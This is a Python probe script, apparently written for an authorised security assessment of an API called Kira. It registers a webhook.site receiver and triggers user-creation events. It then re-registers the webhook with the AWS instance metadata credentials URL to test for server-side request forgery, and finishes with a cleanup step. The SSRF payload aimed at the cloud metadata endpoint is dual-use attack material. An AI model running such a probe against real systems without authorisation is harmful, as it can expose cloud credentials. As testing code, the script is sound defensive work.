"""Probe 1 — SSRF webhook delivery confirmation (OWASP API7:2023 — CRITICAL).

DRIFT-47 proved Kira accepts SSRF-flavored URLs at registration. This probe
answers the unanswered question: does Kira actually FETCH the registered URL
when an event fires?

Plan:
  Step A — register a fresh webhook.site URL as the "real" callback
  Step B — trigger a user.created event (POST /v1/users)
  Step C — poll webhook.site/token/{uuid}/requests for up to 120s
           If delivery confirmed: webhook delivery IS active in sandbox.
  Step D — re-register with the IMDS URL (http://169.254.169.254/...) as the
           target URL. Same client_uuid, last-write-wins per DRIFT-G7 cleanup
           strategy.
  Step E — trigger another user.created event
  Step F — poll webhook.site (the OLD url) for NEW delivery in the next 120s
           If NO new delivery on webhook.site after the IMDS registration:
              → strong evidence Kira's webhook fetcher attempted IMDS
                (and silently dropped on internal block, or worse, succeeded)
           If new delivery on webhook.site:
              → Kira ignored the re-registration (or webhooks are keyed
                differently than we think) — finding still relevant
                (last-write-wins ambiguous)
  Step G — CLEANUP: re-register webhook.site URL as final state. Capture
           the cleanup confirmation.

Read-only stance:
  - We never try to harvest IMDS data ourselves.
  - We only observe Kira's outbound behavior via webhook.site receipt logs.
  - All evidence is the BEFORE / DURING / AFTER state, not any token value.

Run: python3 evidence/work/security/ssrf-webhook-delivery-confirm/probe_ssrf_delivery.py
"""
from __future__ import annotations

import json
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import httpx

HERE = Path(__file__).resolve().parent
WORK = HERE.parents[1]
if str(WORK) not in sys.path:
    sys.path.insert(0, str(WORK))

from _redact import redact_body, redact_headers  # noqa: E402
from run_flow import API_KEY, BASE_URL, CLIENT_ID, auth, fake_business_payload  # noqa: E402

REGISTER_PATH = "/webhooks/register"
WEBHOOK_SITE = "https://webhook.site"
IMDS_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"


def webhook_site_new_token() -> str:
    """Create a fresh webhook.site token."""
    r = httpx.post(f"{WEBHOOK_SITE}/token", json={}, timeout=15.0)
    r.raise_for_status()
    return r.json()["uuid"]


def webhook_site_requests(token: str) -> Dict[str, Any]:
    """Fetch the list of requests received at the given webhook.site token."""
    r = httpx.get(f"{WEBHOOK_SITE}/token/{token}/requests", timeout=15.0)
    r.raise_for_status()
    return r.json()


def register_webhook(token: str, url: str, label: str) -> Dict[str, Any]:
    """Register a webhook URL with Kira. Returns capture record."""
    register_url = f"{BASE_URL}{REGISTER_PATH}"
    headers = {
        "Content-Type": "application/json",
        "x-api-key": API_KEY,
        "Authorization": f"Bearer {token}",
    }
    body = {
        "webhook_url": url,
        "client_uuid": CLIENT_ID,
        "secret": "0" * 32,  # known-fake placeholder
    }
    t0 = time.perf_counter_ns()
    resp = httpx.post(register_url, headers=headers, json=body, timeout=30.0)
    elapsed_ms = (time.perf_counter_ns() - t0) / 1e6
    try:
        rb = resp.json()
    except Exception:
        rb = resp.text[:300]
    return {
        "label": label,
        "method": "POST",
        "url": register_url,
        "elapsed_ms": round(elapsed_ms, 2),
        "status": resp.status_code,
        "request_headers": redact_headers(headers),
        "request_body": redact_body(body),
        "response_headers": {k.lower(): v for k, v in resp.headers.items() if k.lower() in ("x-amzn-requestid", "content-type")},
        "response_body": redact_body(rb) if isinstance(rb, dict) else rb,
    }


def trigger_user_created(token: str, label: str) -> Dict[str, Any]:
    """POST /v1/users → trigger user.created event."""
    url = f"{BASE_URL}/v1/users"
    headers = {
        "Content-Type": "application/json",
        "x-api-key": API_KEY,
        "Authorization": f"Bearer {token}",
        "Idempotency-Key": str(uuid.uuid4()),
    }
    body = fake_business_payload()
    body["email"] = f"sec+ssrf-{label}-{int(time.time())}-{uuid.uuid4().hex[:6]}@example.com"
    t0 = time.perf_counter_ns()
    resp = httpx.post(url, headers=headers, json=body, timeout=30.0)
    elapsed_ms = (time.perf_counter_ns() - t0) / 1e6
    try:
        rb = resp.json()
    except Exception:
        rb = resp.text[:300]
    user_id = rb.get("id") if isinstance(rb, dict) else None
    return {
        "label": label,
        "method": "POST",
        "url": url,
        "elapsed_ms": round(elapsed_ms, 2),
        "status": resp.status_code,
        "user_id_created": user_id,
        "response_body_keys": list(rb.keys()) if isinstance(rb, dict) else None,
    }


def poll_webhook_site(token: str, expected_min_count: int, timeout_s: int = 120, label: str = "") -> Dict[str, Any]:
    """Poll webhook.site every 3s until request count >= expected_min_count or timeout.

    Returns a record with start_count, end_count, elapsed, and a summarized
    list of received requests (no raw payload — just method, ip, headers).
    """
    start = time.time()
    last_count = -1
    polls: List[Dict[str, Any]] = []
    snapshots: List[Dict[str, Any]] = []
    while time.time() - start < timeout_s:
        try:
            d = webhook_site_requests(token)
            count = d.get("total", 0) if isinstance(d, dict) else 0
            if count != last_count:
                snapshots.append({
                    "elapsed_s": round(time.time() - start, 1),
                    "total": count,
                    "requests_summary": [
                        {
                            "method": r.get("method"),
                            "ip": r.get("ip"),
                            "user_agent": r.get("user_agent"),
                            "created_at": r.get("created_at"),
                            "content_excerpt": (r.get("content") or "")[:200],
                            "request_headers_keys": list((r.get("headers") or {}).keys()),
                        }
                        for r in d.get("data", [])
                    ],
                })
                last_count = count
            polls.append({"t": round(time.time() - start, 1), "count": count})
            if count >= expected_min_count:
                break
        except Exception as e:
            polls.append({"t": round(time.time() - start, 1), "error": str(e)})
        time.sleep(3)
    return {
        "label": label,
        "webhook_site_token": token,
        "expected_min_count": expected_min_count,
        "elapsed_s": round(time.time() - start, 1),
        "final_count": last_count,
        "delivery_observed": last_count >= expected_min_count,
        "poll_log": polls[-10:],  # tail only
        "snapshots": snapshots,
    }


def main() -> None:
    print("=== Probe 1 — SSRF delivery confirmation ===")
    bearer = auth()
    if not bearer:
        print("Auth failed")
        sys.exit(1)

    # Step A: fresh webhook.site
    receiver_uuid = webhook_site_new_token()
    receiver_url = f"{WEBHOOK_SITE}/{receiver_uuid}"
    print(f"webhook.site receiver: {receiver_url}")

    events: List[Dict[str, Any]] = []

    # Step A1: register receiver
    reg_a = register_webhook(bearer, receiver_url, "stepA-register-receiver")
    events.append(reg_a)
    print(f"  stepA register: status={reg_a['status']}")

    # Snapshot 0 — webhook.site count before any trigger (should be 0, but
    # webhook.site might have its own pings — capture as baseline)
    baseline = poll_webhook_site(receiver_uuid, expected_min_count=1, timeout_s=5, label="baseline-before-trigger")
    events.append({"step": "stepA-baseline", **baseline})
    print(f"  stepA baseline count: {baseline['final_count']} (delivery_observed={baseline['delivery_observed']})")

    # Step B: trigger a user create
    trig_b = trigger_user_created(bearer, "stepB-trigger-user-created")
    events.append(trig_b)
    print(f"  stepB trigger user: status={trig_b['status']} user_id={trig_b.get('user_id_created')}")

    # Step C: poll for delivery
    expected = max(1, baseline["final_count"] + 1)
    poll_c = poll_webhook_site(receiver_uuid, expected_min_count=expected, timeout_s=120, label="stepC-poll-after-trigger")
    events.append({"step": "stepC", **poll_c})
    print(f"  stepC delivery observed? {poll_c['delivery_observed']} count={poll_c['final_count']} elapsed={poll_c['elapsed_s']}s")

    if not poll_c["delivery_observed"]:
        print("\n[!] No webhook delivery received from Kira even on the SAFE URL.")
        print("    Sandbox does not deliver webhooks for user.created events.")
        print("    Cannot proceed with IMDS comparison test. Cleanup only.")
        # Final cleanup: re-register receiver (idempotent) so we know our
        # tenant's webhook is at the benign URL.
        clean = register_webhook(bearer, receiver_url, "stepG-cleanup-final-overwrite")
        events.append(clean)
        print(f"  cleanup: status={clean['status']}")
        out = HERE / "01-delivery-confirm-results.json"
        out.write_text(json.dumps({
            "captured_at": datetime.now(timezone.utc).isoformat(),
            "receiver_uuid": receiver_uuid,
            "delivery_observed_on_safe_url": False,
            "verdict": "NO DELIVERY IN SANDBOX — cannot confirm or deny outbound SSRF behavior",
            "events": events,
        }, indent=2))
        print("Output:", out)
        return

    # If we got here, delivery works → run IMDS test
    print("\n[+] Delivery to safe URL CONFIRMED. Proceeding with IMDS test.")

    # Capture the count right before the IMDS overwrite
    pre_imds_count = poll_c["final_count"]

    # Step D: re-register with IMDS URL
    reg_d = register_webhook(bearer, IMDS_URL, "stepD-register-imds")
    events.append(reg_d)
    print(f"  stepD register IMDS: status={reg_d['status']}")

    # Step E: trigger another user create
    trig_e = trigger_user_created(bearer, "stepE-trigger-after-imds")
    events.append(trig_e)
    print(f"  stepE trigger user: status={trig_e['status']} user_id={trig_e.get('user_id_created')}")

    # Step F: poll webhook.site again — if Kira fired at IMDS, the safe URL
    # should NOT receive a new delivery
    poll_f = poll_webhook_site(receiver_uuid, expected_min_count=pre_imds_count + 1, timeout_s=120, label="stepF-poll-after-imds-register")
    events.append({"step": "stepF", **poll_f})
    print(f"  stepF new delivery on safe URL? {poll_f['delivery_observed']} (was {pre_imds_count}, now {poll_f['final_count']})")

    if not poll_f["delivery_observed"]:
        ssrf_verdict = (
            "STRONG EVIDENCE OF SSRF: After re-registering with IMDS, the safe "
            "webhook.site URL stopped receiving deliveries. This is consistent with "
            "Kira routing the outbound HTTP to the IMDS URL (silent fetch — no "
            "fallback to previous URL). Kira may or may not have reached IMDS; "
            "but Kira honored the new registration and did NOT send to the safe URL."
        )
    else:
        ssrf_verdict = (
            "Last-write-wins NOT confirmed strictly — safe URL still received "
            "deliveries after IMDS registration. Possibilities: (a) sandbox "
            "ignores webhook re-registration and the old URL is still active "
            "(better for security but a Kira bug); (b) Kira fires to ALL "
            "registered URLs (multi-row table) — worse for security since SSRF "
            "URLs never get cleaned up."
        )

    # Step G: cleanup — final overwrite to put us back on the safe URL
    clean = register_webhook(bearer, receiver_url, "stepG-cleanup-final-overwrite")
    events.append(clean)
    print(f"  stepG cleanup: status={clean['status']}")

    summary = {
        "captured_at": datetime.now(timezone.utc).isoformat(),
        "receiver_uuid": receiver_uuid,
        "receiver_url": receiver_url,
        "imds_url_used": IMDS_URL,
        "client_uuid": "REDACTED(36)",
        "delivery_observed_on_safe_url": True,
        "delivery_observed_after_imds_registration": poll_f["delivery_observed"],
        "verdict": ssrf_verdict,
        "events": events,
    }
    out = HERE / "01-delivery-confirm-results.json"
    out.write_text(json.dumps(summary, indent=2))
    print("\nOutput:", out)
    print("VERDICT:", ssrf_verdict[:200])


if __name__ == "__main__":
    main()
